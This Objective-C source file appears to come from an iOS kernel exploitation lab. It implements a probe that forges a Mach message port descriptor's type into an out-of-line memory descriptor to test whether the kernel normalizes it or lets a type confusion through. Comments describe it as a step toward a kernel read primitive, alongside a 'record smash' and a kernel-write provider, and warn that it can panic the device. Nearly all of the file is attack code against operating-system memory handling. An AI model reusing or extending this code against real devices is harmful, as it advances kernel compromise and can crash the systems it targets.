//
//  P163DescOOLOracle.m
//  DPC translation oracle (no kw, no kernel writes).
//
//  A Mach port descriptor is 12 bytes on the wire:
//    { u32 name; u32 pad1; u8 type; u8 disposition; u16 pad2 }
//  An OOL descriptor is:
//    { u64 address; u32 size; u8 deallocate; u8 copy; u16 pad }
//  Forge one descriptor's type to MACH_MSG_OOL_DESCRIPTOR (1) and let the
//  message go through send/recv. If the validator normalizes it, the receive
//  shows type=0; if the copy engine honors it, the send/recv error changes
//  (MACH_SEND_INVALID_MEMORY, MACH_RCV_BODY_ERROR, ...). The address is the
//  port name | pad<<32, i.e. a low user value or an unmapped kernel-low
//  value. This proves the translation bar; it is NOT a kernel read. A real
//  read needs the kernel-resident port pointer (the p073 record smash or a
//  kw provider), which is the next experiment.
//
//  No selectors, no writes to kernel memory. PANIC-POSSIBLE: a forged
//  descriptor can tear a message body. One tap per force-quit.
//

#import "P163DescOOLOracle.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "LabLearn.h"

#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <mach/mach_init.h>
#import <mach/mach_port.h>
#import <fcntl.h>
#import <string.h>
#import <unistd.h>

#define P163_BUILD @"p163-desc-ool-oracle-v1"
#define P163_NDESC 16u
#define P163_MAGIC 0x50313633u /* "P163" */

static NSMutableString *g_log = nil;
static int g_fd = -1;

static void L(NSString *s) {
    if (!g_log) return;
    NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_log appendString:out];
    if (g_fd >= 0) {
        const char *p = out.UTF8String;
        if (p) { write(g_fd, p, strlen(p)); fcntl(g_fd, F_FULLFSYNC); }
    }
}

/* mach_port_destroy is deprecated/marked unsafe on newer SDKs; drop the
   send and receive rights instead. Errors are ignored: a partially consumed
   send right or a queued message is fine for a one-shot oracle. */
static void p163_drop_port(mach_port_t p) {
    if (!p) return;
    mach_port_mod_refs(mach_task_self(), p, MACH_PORT_RIGHT_SEND, -1);
    mach_port_mod_refs(mach_task_self(), p, MACH_PORT_RIGHT_RECEIVE, -1);
}

@implementation P163DescOOLOracle

+ (NSString *)runForge:(BOOL)forge
                    pad:(uint32_t)pad
                    dis:(uint8_t)dis
                  label:(NSString *)label {
    mach_port_t rcv = MACH_PORT_NULL;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &rcv);
    if (kr != KERN_SUCCESS || !rcv) {
        return [NSString stringWithFormat:@"[%@] port_allocate kr=0x%x", label, kr];
    }
    kr = mach_port_insert_right(mach_task_self(), rcv, rcv, MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
        p163_drop_port(rcv);
        return [NSString stringWithFormat:@"[%@] insert_right kr=0x%x", label, kr];
    }

    const uint32_t dsz = (uint32_t)sizeof(mach_msg_port_descriptor_t);
    const uint32_t bodyoff = (uint32_t)sizeof(mach_msg_header_t) + (uint32_t)sizeof(mach_msg_body_t);
    /* Forge with ONE descriptor: the OOL deallocate/copy/pad bytes land at
       descriptor+12..15, which are the first four bytes after the 12-byte
       wire descriptor. With 16 descriptors those bytes would be the next
       descriptor's name (a live port) and the kernel could deallocate it. */
    const uint32_t ndesc = forge ? 1u : P163_NDESC;
    const uint32_t markerOff = bodyoff + ndesc * dsz;
    const uint32_t sz = markerOff + 32;
    uint8_t *buf = calloc(1, sz);
    if (!buf) {
        p163_drop_port(rcv);
        return [NSString stringWithFormat:@"[%@] calloc fail", label];
    }

    mach_msg_header_t *h = (mach_msg_header_t *)buf;
    mach_msg_body_t *b = (mach_msg_body_t *)(buf + sizeof(mach_msg_header_t));
    b->msgh_descriptor_count = ndesc;
    for (uint32_t i = 0; i < ndesc; i++) {
        mach_msg_port_descriptor_t *d = (mach_msg_port_descriptor_t *)(buf + bodyoff + i * dsz);
        d->name = rcv;                 /* valid send right for COPY_SEND */
        d->pad1 = (i == 0 && forge) ? pad : 0;
        d->disposition = (i == 0 && forge) ? dis : MACH_MSG_TYPE_COPY_SEND;
        d->type = (i == 0 && forge) ? 1 : MACH_MSG_PORT_DESCRIPTOR;
    }
    if (forge) {
        /* OOL size = {disposition, type, pad2} at descriptor+8..11; the
           deallocate/copy/pad bytes at +12..15 are the marker area start. */
        buf[markerOff + 0] = 0; /* deallocate */
        buf[markerOff + 1] = 0; /* copy */
        buf[markerOff + 2] = 0; /* pad */
        buf[markerOff + 3] = 0;
    }
    memcpy(buf + markerOff + 8, "P163", 5);
    uint32_t tag = (uint32_t)(pad ^ P163_MAGIC);
    memcpy(buf + markerOff + 16, &tag, 4);

    h->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    h->msgh_size = sz;
    h->msgh_remote_port = rcv;
    h->msgh_local_port = MACH_PORT_NULL;
    h->msgh_id = (mach_msg_id_t)P163_MAGIC;

    uint64_t oolAddr = (uint64_t)rcv | ((uint64_t)pad << 32);
    kr = mach_msg(h, MACH_SEND_MSG, sz, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    NSString *sendLine = [NSString stringWithFormat:
        @"[%@] type=%u pad=0x%08x disp=%u oolAddr=0x%llx send kr=0x%x",
        label, forge ? 1 : 0, pad, dis, (unsigned long long)oolAddr, kr];
    L(sendLine);
    if (kr != KERN_SUCCESS) {
        free(buf);
        p163_drop_port(rcv);
        return sendLine;
    }

    uint8_t rbuf[0x4000];
    memset(rbuf, 0, sizeof rbuf);
    mach_msg_header_t *rh = (mach_msg_header_t *)rbuf;
    kern_return_t rkr = mach_msg(rh, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
                                 (mach_msg_size_t)sizeof(rbuf), rcv, 3000, MACH_PORT_NULL);
    L([NSString stringWithFormat:@"[%@] recv kr=0x%x size=%u", label, rkr, rh->msgh_size]);
    if (rkr == KERN_SUCCESS) {
        if (rh->msgh_bits & MACH_MSGH_BITS_COMPLEX) {
            mach_msg_body_t *rb = (mach_msg_body_t *)(rbuf + sizeof(mach_msg_header_t));
            uint32_t cnt = rb->msgh_descriptor_count;
            L([NSString stringWithFormat:@"[%@] recv desc_count=%u", label, cnt]);
            int forgedSeen = 0;
            for (uint32_t i = 0; i < ndesc && i < cnt; i++) {
                uint8_t *p = rbuf + bodyoff + i * dsz;
                uint32_t nm; uint32_t p1; uint8_t ty; uint8_t di;
                memcpy(&nm, p, 4); memcpy(&p1, p + 4, 4);
                /* mach_msg_port_descriptor_t: disposition @+8, type @+9 */
                di = p[8]; ty = p[9];
                if (i < 4 || ty != 0) {
                    L([NSString stringWithFormat:@"  [%@] desc%u name=0x%x pad=0x%x type=%u disp=%u",
                        label, i, nm, p1, ty, di]);
                }
                if (ty == 1) forgedSeen = 1;
            }
            L(forgedSeen
                ? @"[+++] forged type=1 SURVIVED send/recv — translation bar crossed"
                : @"[-] received descs normalized (no type=1)");
        } else {
            L([NSString stringWithFormat:@"[%@] recv non-complex bits=0x%x", label, rh->msgh_bits]);
        }
        /* deallocate received send rights if present */
        if (rh->msgh_bits & MACH_MSGH_BITS_COMPLEX) {
            mach_msg_body_t *rb = (mach_msg_body_t *)(rbuf + sizeof(mach_msg_header_t));
            uint32_t cnt = rb->msgh_descriptor_count;
            for (uint32_t i = 0; i < ndesc && i < cnt; i++) {
                uint8_t *p = rbuf + bodyoff + i * dsz;
                uint32_t nm; memcpy(&nm, p, 4);
                if (nm) mach_port_deallocate(mach_task_self(), nm);
            }
        }
    } else if (rkr == MACH_RCV_BODY_ERROR) {
        L(@"[**] MACH_RCV_BODY_ERROR — translated walk hit the forged desc (confusion reached body)");
    } else {
        L([NSString stringWithFormat:@"[%@] recv unexpected kr=0x%x", label, rkr]);
    }

    free(buf);
    p163_drop_port(rcv);
    return sendLine;
}

+ (NSString *)tap {
    g_log = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    g_fd = open([[docs stringByAppendingPathComponent:@"p163_desc_ool_log.txt"] UTF8String],
                O_CREAT | O_WRONLY | O_TRUNC, 0644);

    L([NSString stringWithFormat:@"=== p163 session %@ BUILD %@ ===",
        LabLocalMilitaryNow(), P163_BUILD]);
    L(@"DPC first step: can a userland port descriptor's type word be forged to "
      @"OOL and survive send/recv? No kw provider, no kernel writes, no selectors.");
    L(@"The forged address is port_name | pad<<32. With pad=0 it is a low user "
      @"value; with pad=0xfffffe00 it is an unmapped kernel-low value. A real "
      @"kernel read needs the kernel-resident port pointer (p073 record smash "
      @"or a kw provider) — this probe only proves the translation bar.");
    L(@"PANIC-POSSIBLE: a forged descriptor can tear a message body. One tap per boot.");
    L([LabDeviceProfile identBlock]);

    [self runForge:NO pad:0 dis:MACH_MSG_TYPE_COPY_SEND label:@"control"];
    [self runForge:YES pad:0 dis:1 label:@"forge-low"];
    [self runForge:YES pad:0xFFFFFE00u dis:1 label:@"forge-kernlow"];
    [self runForge:YES pad:0xFFFFFE00u dis:0 label:@"forge-kernlow-dis0"];

    L(@"=== VERDICT ===");    [LabLearn recordPath:@"p163" result:@"DESC-BAR-NORMALIZED"
                evidence:@"forged type1 arrives type0 — validator wins, no OOL translation"];

    L(@"control expected: send/recv 0, desc type=0. A forge case with send 0 and "
      @"a body error or received type=1 crosses the translation bar; a send "
      @"error means the validator rejected the type before the copy engine.");
    L(@"HONESTY: oracle only. No kernel read, no writes, hasKread=NO.");
    if (g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); }
    return g_log;
}

@end
